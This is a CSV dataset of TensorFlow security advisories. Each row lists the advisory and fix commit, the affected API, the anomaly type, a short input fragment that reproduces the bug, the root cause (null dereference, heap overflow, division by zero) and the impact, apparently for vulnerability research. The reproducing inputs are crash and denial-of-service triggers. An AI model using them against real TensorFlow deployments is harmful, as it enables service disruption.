Library,Advisory Link,Commit,Parent Module,API,Anomaly,Reproducing Example,Vulnerable Parameter,Root cause 1,Root cause 2,Attack type
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vmjw-c2vp-p33c,https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d,tf.raw_ops,tf.raw_ops.NonMaxSuppressionV5,Negative argument,"max_output_size=-1,",max_output_size,N.A,division by zero,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vmjw-c2vp-p33c,https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d,tf.raw_ops,tf.raw_ops.CombinedNonMaxSuppression,Negative argument,"max_output_size=-1,",max_output_size,N.A,division by zero,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2wmv-37vq-52g5,https://github.com/tensorflow/tensorflow/commit/a776040a5e7ebf76eeb7eb923bf1ae417dd4d233,tf.raw_ops,tf.raw_ops.UnravelIndex,Zero element ,"dims=[1,0,2]",dimes,N.A,division by zero,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w74j-v8xh-3w5h,https://github.com/tensorflow/tensorflow/commit/2e0ee46f1a47675152d3d865797a18358881d7a6,tensorflow.python.ops,gen_string_ops.unicode_encode,Empty input,"input_splits=[],",input_splits,N.A,nullptr dereference,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w4xf-2pqw-5mq7,https://github.com/tensorflow/tensorflow/commit/be7a4de6adfbd303ce08be4332554dff70362612,tf.raw_ops,tf.raw_ops.RaggedTensorToVariant,Empty input,"rt_nested_splits=[],",rt_nested_splits,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69,tf.raw_ops,tf.raw_ops.RequantizationRangePerChannel,Empty input,"input=[],",input,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69,tf.raw_ops,tf.raw_ops.RequantizationRangePerChannel,Element mismatch,"input_min=[-100,-100,-100,-100,-100],
input_max=[-100,-100,-100],","input_min
input_max",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69,tf.raw_ops,tf.raw_ops.RequantizationRangePerChannel,Element mismatch,"input=[],
input_min=[-100,-100,-100,-100,-100],","input
input_min",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9,tensorflow.python.ops,gen_math_ops.requantize_per_channel,Non scalar input,"requested_output_min=[-100,-100,-100,-100,-100],",requested_output_min,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9,tensorflow.python.ops,gen_math_ops.requantize_per_channel,Non scalar input,"requested_output_max=[],",requested_output_max,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9,tensorflow.python.ops,gen_math_ops.requantize_per_channel,Element mismatch,"input_min=[-100,-100,-100,-100,-100],
input_max=[-100,-100,-100],","input_min
input_max",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9,tensorflow.python.ops,gen_math_ops.requantize_per_channel,Empty input,"input=[],",input,N.A,nullptr dereference,undefined behavior
,,,,,,,,,,
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g25h-jr74-qp5j,https://github.com/tensorflow/tensorflow/commit/6da6620efad397c85493b8f8667b821403516708,tf.raw_ops,tf.raw_ops.QuantizeV2,Element mismatch,"min_range=[1,2],
max_range=[],","min_range
max_range",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r4c4-5fpq-56wg,https://github.com/tensorflow/tensorflow/commit/e84c975313e8e8e38bb2ea118196369c45c51378,tf.raw_ops,tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit,Element mismatch,"stats_summary_indices=[[1, 2, 3, 0x1000000]],",stats_summary_indices,N.A,out of bound read,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gf88-j2mg-cc82,https://github.com/tensorflow/tensorflow/commit/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992,tensorflow.python.ops,gen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource,Negative argument,"num_streams = [-49],",num_streams,N.A,N.A,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cm5x-837x-jf3c,https://github.com/tensorflow/tensorflow/commit/e86605c0a336c088b638da02135ea6f9f6753618,tf.raw_ops,tf.raw_ops.InplaceSub,Empty input,x=[],x,N.A,division by zero,Floating point exception
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q3g3-h9r4-prrc,https://github.com/tensorflow/tensorflow/commit/93f428fd1768df147171ed674fee1fc5ab8309ec,tf.raw_ops,tf.raw_ops.SqrtGrad,Element mismatch,"y=[4, 16]
dy=[]","y, dy",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6p5r-g9mq-ggh2,https://github.com/tensorflow/tensorflow/commit/ff8894044dfae5568ecbf2ed514c1a37dc394f1b,tf.raw_ops,tf.raw_ops.MatrixSetDiagV3,Empty input,"k=[],",k,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5xwc-mrhx-5g3m,https://github.com/tensorflow/tensorflow/commit/f2a673bd34f0d64b8e40a551ac78989d16daad09,tf.raw_ops,tf.raw_ops.MatrixDiagV3,Empty input,"k=[],",k,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4xfp-4pfp-89wg,https://github.com/tensorflow/tensorflow/commit/1071f554dbd09f7e101324d366eec5f4fe5a3ece,tf.raw_ops,tf.raw_ops.RaggedTensorToSparse,Non increasing order of elements,"rt_nested_splits=[[0, 38, 0]],",rt_nested_splits,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7fvx-3jfc-2cpc,https://github.com/tensorflow/tensorflow/commit/01cff3f986259d661103412a20745928c727326f,tf.raw_ops,tf.raw_ops.ResourceScatterUpdate,Dimension mismatch,"indices=[0],
updates=['1', '2', '3', '4', '5']","indices
updates",N.A,out of bound read,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2r8p-fg3c-wcj4,https://github.com/tensorflow/tensorflow/commit/bc9c546ce7015c57c2f15c168b3d9201de679a1d,tf.raw_ops,tf.raw_ops.ResourceGather,Dimension mismatch,"batch_dims=10,",batch_dims,N.A,check failure,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qjj8-32p7-h289,https://github.com/tensorflow/tensorflow/commit/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11,tf.raw_ops,tf.raw_ops.ResourceGather,Zero argument,"indices=[0],",indices,N.A,floating point exception,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr,https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Zero element ,"orig_input_tensor_shape=[0,1,2,3],",orig_input_tensor_shape,N.A,out of bound read,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr,https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Zero element ,"row_pooling_sequence=[0, 0, 0, 0, 0],",row_pooling_sequence,N.A,out of bound read,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr,https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Zero element ,"col_pooling_sequence=[-2, 0, 0, 2, 0],",col_pooling_sequence,N.A,out of bound read,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f8h4-7rgh-q2gm,https://github.com/tensorflow/tensorflow/commit/e0b6e58c328059829c3eb968136f17aa72b6c876,tf.raw_ops,tf.raw_ops.ExperimentalDatasetToTFRecord,String input dataset,"input_dataset=dataset,",input_dataset,N.A,heap buffer overflow,segfault
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6gv8-p3vj-pxvr,https://github.com/tensorflow/tensorflow/commit/7bdf50bb4f5c54a4997c379092888546c97c3ebd,tf.raw_ops,tf.raw_ops.UncompressElement,Tensor input,"compressed=tf.data.experimental.to_variant(data),",compressed,N.A,nullptr dereference,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c5x2-p679-95wc,https://github.com/tensorflow/tensorflow/commit/02cc160e29d20631de3859c6653184e3f876b9d7,tf.raw_ops,tf.raw_ops.SparseTensorSliceDataset,Empty input,"indices=[[],[],[]],",indices,N.A,nullptr dereference,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h6jh-7gv5-28vg,https://github.com/tensorflow/tensorflow/commit/c283e542a3f422420cfdb332414543b62fc4e4a5,tf.raw_ops,tf.raw_ops.StringNGrams,Negative argument,"ngram_widths=[-80,0,0,-60],",ngram_widths,N.A,integer type conversion,integer overflow
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9w2p-5mgw-p94c,https://github.com/tensorflow/tensorflow/commit/96f364a1ca3009f98980021c4b32be5fdcca33a1,tf.raw_ops,tf.raw_ops.QuantizeAndDequantizeV4Grad,Negative argument,"axis=-100,",axis,N.A,integer type conversion,integer overflow
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fcwc-p4fc-c5cc,https://github.com/tensorflow/tensorflow/commit/482da92095c4d48f8784b1f00dda4f81c28d2988,tf.raw_ops,tf.raw_ops.MatrixDiagPartV2,Non scalar input,padding_value=[],padding_value,N.A,nullptr dereference,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-27j5-4p9v-pp67,https://github.com/tensorflow/tensorflow/commit/8a6e874437670045e6c7dc6154c7412b4a2135e2,tf.raw_ops,tf.raw_ops.TensorListReserve,Negative argument,num_elements=tf.constant([-1],num_elements,N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-vvrj-w2p8,https://github.com/tensorflow/tensorflow/commit/a2b743f6017d7b97af1fe49087ae15f0ac634373,tf.raw_ops,tf.raw_ops.RaggedGather,Rank less than 1,"params_nested_splits = [0,0,0]",params_nested_splits,N.A,out of bound read,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-vvrj-w2p8,https://github.com/tensorflow/tensorflow/commit/a2b743f6017d7b97af1fe49087ae15f0ac634373,tf.raw_ops,tf.raw_ops.RaggedGather,Empty input,"params_nested_splits = [0,0,0]",params_nested_splits,N.A,out of bound read,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-ch4f-829c-v5pw,https://github.com/tensorflow/tensorflow/commit/4aacb30888638da75023e6601149415b39763d76,tf.raw_ops,tf.raw_ops.ResourceScatterDiv,Zero element ,updates=[0],updates,N.A,division by zero,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-95xm-g58g-3p88,https://github.com/tensorflow/tensorflow/commit/4923de56ec94fff7770df259ab7f2288a74feb41,tf.raw_ops,tf.raw_ops.SparseReshape,Zero element ,"input_shape = np.array([1,1,0]),
new_shape = np.array([1,0])","input_shape, new_shape",N.A,division by zero,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh6x-4whr-2qv4,https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622,tf.raw_ops,tf.raw_ops.Restore,Empty input,tensor_name=[],tensor_name,N.A,nullptr dereference,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh6x-4whr-2qv4,https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622,tf.raw_ops,tf.raw_ops.RestoreSlice,Empty input,tensor_name=[],tensor_name,N.A,nullptr dereference,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hwr7-8gxx-fj5p,https://github.com/tensorflow/tensorflow/commit/301ae88b331d37a2a16159b65b255f4f9eb39314,tf.raw_ops,tf.raw_ops.RaggedTensorToTensor,Empty input,row_partition_types=[],row_partition_types,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9qf-r67m-p7cg,https://github.com/tensorflow/tensorflow/commit/5dc7f6981fdaf74c8c5be41f393df705841fb7c5,tf.raw_ops,tf.raw_ops.CompressElement,Empty input,components=[[]],components,N.A,nullptr dereference,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hp4c-x6r7-6555,https://github.com/tensorflow/tensorflow/commit/d9204be9f49520cdaaeb2541d1dc5187b23f31d9,tf.raw_ops,tf.raw_ops.SparseDenseCwiseDiv,Empty input,dense=np.array([0]),dense,N.A,floating point exception,division by zero
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wvjw-p9f5-vq28,https://github.com/tensorflow/tensorflow/commit/82e6203221865de4008445b13c69b6826d2b28d9,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Zero element ,dense_shape=[],dense_shape,N.A,N.A,segfault
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mmq6-q8r3-48fm,https://github.com/tensorflow/tensorflow/commit/890f7164b70354c57d40eda52dcdd7658677c09f,tf.strings,tf.strings.substr,Dimension mismatch,"len=1
pos=[1,-1]","len
pos",N.A,N.A,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xqfj-cr6q-pc8w,https://github.com/tensorflow/tensorflow/commit/1dc6a7ce6e0b3e27a7ae650bfc05b195ca793f88,tf.raw_ops,tf.transpose,Argument mismatch,"conjugate=True
a=complex(1)","conjugate
a",N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8pmx-p244-g88h,https://github.com/tensorflow/tensorflow/commit/698e01511f62a3c185754db78ebce0eee1f0184d,tf.io,tf.io.decode_raw,Argument mismatch,"tf.uint16
fixed_length=4","tf.uint16
fixed_length",N.A,wrong results,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7,https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c,tf.raw_ops,tf.raw_ops.CTCLoss,First dimension is zero,"inputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)",inputs,N.A,out of bound read,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7,https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c,tf.raw_ops,tf.raw_ops.CTCLoss,Second dimension less than 1,"labels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)",labels_indices ,N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7,https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c,tf.raw_ops,tf.raw_ops.CTCLoss,Empty input,"labels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)
labels_values = tf.constant([], shape=[0], dtype=tf.int32)","labels_indices
labels_values",N.A,nullptr dereference,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2xgj-xhgf-ggjv,https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2,tf.raw_ops,tf.raw_ops.BandedTriangularSolve,Empty input,"matrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)
rhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)","matrix_tensor
rhs_tensor",N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mq5c-prh3-3f3h,https://github.com/tensorflow/tensorflow/commit/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9,tf.raw_ops,tf.raw_ops.QuantizeAndDequantizeV2,Rank less than 1,axis=-2,axis,N.A,heap underflow,read/write to other data on the heap
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f,https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6,tf.raw_ops,tf.raw_ops.SparseReshape,Scalar input,"input_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)",input_indices,N.A,check failure,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f,https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6,tf.raw_ops,tf.raw_ops.SparseReshape,Scalar input,"input_shape = tf.zeros([11], dtype=tf.int64)",input_shape,N.A,check failure,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f,https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6,tf.raw_ops,tf.raw_ops.SparseReshape,Dimension mismatch,"new_shape = tf.zeros([1], dtype=tf.int64)",new_shape,N.A,check failure,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq,https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2,tf.raw_ops,tf.raw_ops.SparseSparseMinimum,Dimension mismatch,"a_indices = tf.ones([45, 92], dtype=tf.int64)
b_indices = tf.ones([1, 1], dtype=tf.int64)","a_indices
b_indices",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq,https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2,tf.raw_ops,tf.raw_ops.SparseSparseMinimum,Dimension mismatch,"a_indices = tf.ones([45, 92], dtype=tf.int64)
a_shape = tf.ones([1], dtype=tf.int64)","a_indices
a_shape",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq,https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2,tf.raw_ops,tf.raw_ops.SparseSparseMinimum,Empty input,"a_indices = tf.ones([45, 92], dtype=tf.int64)
a_values = tf.ones([45], dtype=tf.int64)
a_shape = tf.ones([1], dtype=tf.int64)
b_indices = tf.ones([1, 1], dtype=tf.int64)
b_values = tf.ones([1], dtype=tf.int64)
b_shape = tf.ones([1], dtype=tf.int64)","a_indices
a_values 
a_shape
b_indices
b_values
b_shape",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64,https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc,tf.raw_ops,tf.raw_ops.SparseAdd,Dimension mismatch,"a_indices = tf.zeros([10, 97], dtype=tf.int64)
a_values = tf.zeros([10], dtype=tf.int64)","a_indices
a_shape",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64,https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc,tf.raw_ops,tf.raw_ops.SparseAdd,Empty input,"a_indices = tf.zeros([10, 97], dtype=tf.int64)
a_values = tf.zeros([10], dtype=tf.int64)
a_shape = tf.zeros([0], dtype=tf.int64)
b_indices = tf.zeros([0, 0], dtype=tf.int64)
b_values = tf.zeros([0], dtype=tf.int64)
b_shape = tf.zeros([0], dtype=tf.int64)","a_indices
a_values 
a_shape
b_indices
b_values
b_shape",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64,https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc,tf.raw_ops,tf.raw_ops.SparseAdd,Dimension mismatch,"b_indices = tf.zeros([0, 0], dtype=tf.int64)",b_indices,N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rgvq-pcvf-hx75,https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a,tf.raw_ops,tf.raw_ops.RaggedTensorToTensor,Empty input,"shape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)
values = tf.constant([], shape=[0], dtype=tf.int64)
default_value = tf.constant(404, dtype=tf.int64)
row = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)","shape
values
default_value
row",N.A,nullptr dereference,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cfx7-2xpc-8w4h,https://github.com/tensorflow/tensorflow/commit/2c74674348a4708ced58ad6eb1b23354df8ee044,tf.raw_ops,tf.raw_ops.BatchToSpaceNd,Zero element ,N.A,N.A,N.A,division by zero,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v52p-hfjf-wg88,https://github.com/tensorflow/tensorflow/commit/6d36ba65577006affb272335b7c1abd829010708,tf.raw_ops,tf.raw_ops.SpaceToBatchND,Zero element ,N.A,N.A,N.A,division by zero,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-97wf-p777-86jq,https://github.com/tensorflow/tensorflow/commit/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d,tf,tf.split,Zero argument,num_or_size_splits=0,num_or_size_splits,N.A,division by zero,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j8qh-3xrq-c825,https://github.com/tensorflow/tensorflow/commit/3ebedd7e345453d68e279cfc3e4072648e5e12e5,tf,tf.one_hot,Zero element ,"indices=[1,1,0,1],",indices,N.A,division by zero,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9xh4-23q4-v6wr,https://github.com/tensorflow/tensorflow/commit/6972f9dfe325636b3db4e0bc517ee22a159365c0,tf.raw_ops,tf.raw_ops.FusedBatchNorm,Empty input,"scale = tf.constant([0.0], shape=[1], dtype=tf.float32)
offset = tf.constant([0.0], shape=[1], dtype=tf.float32)
mean = tf.constant([0.0], shape=[1], dtype=tf.float32)
variance = tf.constant([0.0], shape=[1], dtype=tf.float32)","scale
offset
mean
variance",N.A,heap buffer overflow,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xvjm-fvxx-q3hv,https://github.com/tensorflow/tensorflow/commit/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60,tf.raw_ops,tf.raw_ops.SparseSplit,Very large input argument,"shape=(input_layer, input_layer),",shape,N.A,check failure,integer overflow
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c45w-2wxr-pp53,https://github.com/tensorflow/tensorflow/commit/5899741d0421391ca878da47907b1452f06aaf1b,tf.raw_ops,tf.raw_ops.Dequantize,Dimension mismatch,"min_range = tf.constant([-10], shape=[1], dtype=tf.float32)
max_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)","min_range
max_range",N.A,out of bound read,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vq2r-5xvm-3hc3,https://github.com/tensorflow/tensorflow/commit/b1b323042264740c398140da32e93fb9c2c9f33e,tf.raw_ops,tf.raw_ops.CTCBeamSearchDecoder,Empty input,"inputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)",inputs,N.A,segfault,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6f89-8j54-29xf,https://github.com/tensorflow/tensorflow/commit/12c727cee857fa19be717f336943d95fca4ffe4f,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Not enough elements,"row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)
col_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)","""row_pooling_sequence
col_pooling_sequence",N.A,heap buffer overflow,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x8h6-xgqx-jqgp,https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925,tf.raw_ops,tf.raw_ops.FractionalMaxPoolGrad,Empty input,"orig_output = tf.constant([], dtype=tf.int64) ",orig_output,N.A,check failure,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v6r6-84gr-92rm,https://github.com/tensorflow/tensorflow/commit/6fc9141f42f6a72180ecd24021c3e6b36165fe0d,tf.raw_ops,tf.raw_ops.AvgPool3DGrad,Dimension mismatch,"orig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)
grad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)","orig_input_shape
grad",N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7cqx-92hp-x6wh,https://github.com/tensorflow/tensorflow/commit/63c6a29d0f2d692b247f7bf81f8732d6442fad09,tf.raw_ops,tf.raw_ops.MaxPool3DGradGrad,Dimension mismatch,"orig_input = tf.constant(values, shape=[11, 1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)","orig_input
grad",N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-828x-qc2p-wprq,https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4,tf.raw_ops,tf.raw_ops.MaxPool3DGradGrad,Empty input,"orig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
orig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)","orig_input
orig_output
grad",N.A,nullptr dereference,undefined behavior
